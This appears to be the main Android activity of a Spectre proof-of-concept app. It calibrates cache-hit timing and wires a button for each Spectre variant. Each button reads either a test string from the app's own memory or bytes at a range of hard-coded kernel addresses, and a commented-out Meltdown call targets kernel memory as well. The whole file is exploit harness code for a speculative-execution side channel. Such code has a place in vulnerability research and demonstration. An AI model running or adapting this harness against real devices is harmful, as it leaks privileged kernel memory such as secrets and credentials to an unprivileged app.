package android.spectre;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.LinearLayout;
import android.widget.Switch;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.Arrays;
import java.util.Scanner;

public class MainActivity extends AppCompatActivity {
    public static final String TAG = MainActivity.class.getSimpleName();
    public static final Object SPECTRE_MUTEX = new Object();
    public static final Spectre.Callback quietCallback = new Spectre.Callback() {
        @Override
        public void onByte(int offset, long pointer, byte bestGuess, int bestScore, byte secondGuess, int secondScore) {
        }
    };

    void setupCache(boolean log) {
        int[] hitTimes  = new int[11];
        int[] missTimes = new int[11];
        int cacheThreshold = Spectre.calibrateTiming(1024, hitTimes, missTimes);
        if (!log) {
            Log.i(TAG, "Cache hit: " + Arrays.toString(hitTimes));
            Log.i(TAG, "Cache miss: " + Arrays.toString(missTimes));
            Log.i(TAG, "Cache threshold: " + cacheThreshold);
        }
    }


    class SpectreCallback implements Spectre.Callback {
        final byte[] actualValue;

        public SpectreCallback() {
            this(null);
        }

        public SpectreCallback(byte[] actualValue) {
            this.actualValue = actualValue;
        }

        @Override
        public void onByte(int offset, long pointer, byte bestGuess, int bestScore, byte secondGuess, int secondScore) {
            String msg = String.format("ptr=0x%016x, %s, %02x => '%c', score=%d",
                    pointer,
                    bestScore >= 2 * secondScore ? ": Success" : ": Unclear",
                    bestGuess,
                    bestGuess > 31 && bestGuess < 127 ? (char) bestGuess : '�',
                    bestScore);

            if (secondScore > 0) {
                msg += String.format("  --  Second guess: %02x => '%c', score=%d",
                        secondGuess,
                        secondGuess > 31 && secondGuess < 127 ? (char) secondGuess : '�',
                        secondScore);
            }

            if (actualValue != null) {
                if (bestGuess != actualValue[offset]) {
                    msg += String.format("  --  Wrong! Should be %02x => '%c'",
                            actualValue[offset],
                            actualValue[offset] > 31 && actualValue[offset] < 127 ? (char) actualValue[offset] : '�');
                } else {
                    msg += " -- Correct";
                }
            }
            Log.i(TAG, msg);
        }
    }

    void accessLocalMemory(Spectre.Variant variant, String msg) {
        setupCache(false);
        Spectre.read("WARM-UPonjsopdjnfisafjdnaslkdjfnlksadjfnpisdjsijdfsakmfnpdijfn sfhnosjdiuhbfushgfuhofdpjfnda".getBytes(), quietCallback, variant);
        setupCache(true);

        Log.i(TAG, "Using " + variant.description + " to read '" + msg + "'");
        final byte[] raw_data = msg.getBytes();
        Spectre.read(raw_data, new SpectreCallback(raw_data), variant);
    }

    void accessKernelMemory(Spectre.Variant variant, long ptr, int len) {
        /*setupCache(false);
        Spectre.read("WARM-UP".getBytes(), quietCallback, variant);
        setupCache(true);
        */
        Log.i(TAG, "Using " + variant.description + " to read " + len + "bytes at " + String.format("0x%016x", ptr));
        Spectre.read(ptr, len, new SpectreCallback(), variant);
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        final Switch memorySpaceSwitch = (Switch)findViewById(R.id.sw_memory_space);
        memorySpaceSwitch.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                memorySpaceSwitch.setText(isChecked ? "Kernel Space" : "Process Space");
            }
        });
        memorySpaceSwitch.setChecked(true);
        memorySpaceSwitch.setChecked(false);

        LinearLayout layout = (LinearLayout) findViewById(R.id.root_layout);
        for (final Spectre.Variant variant : Spectre.Variant.values()) {
            Button button = new Button(this);
            button.setText(variant.description);
            layout.addView(button);

            button.setOnClickListener(new Button.OnClickListener() {
                public void onClick(View v) {
                    Thread t = new Thread() {
                        @Override
                        public void run() {
                            synchronized (SPECTRE_MUTEX) {
                                if (memorySpaceSwitch.isChecked()) {
                                    for (int i=0; i<1024; i++) {
                                        if (i % 256 == 0) {
                                            setupCache(false);
                                        }
                                        accessKernelMemory(variant, 0xffffffd140000000L + 157 + 0x1000000*i, 4);
                                    }
                                } else {
                                    accessLocalMemory(variant, "Mary had a little lamb");
                                }
                            }
                        }
                    };
                    t.setPriority(Thread.MAX_PRIORITY);
                    t.start();
                }
            });
        }
        /*
        Button btnMeltdown = (Button) findViewById(R.id.btn_meltdown);
        btnMeltdown.setOnClickListener(new Button.OnClickListener() {
            public void onClick(View v) {
                Thread t = new Thread() {
                    @Override
                    public void run() {
                        meltdown(0xffffffc00008f000L, 256);
                    }
                };
                t.setPriority(Thread.MAX_PRIORITY);
                t.start();
            }
        });
        */
    }
}
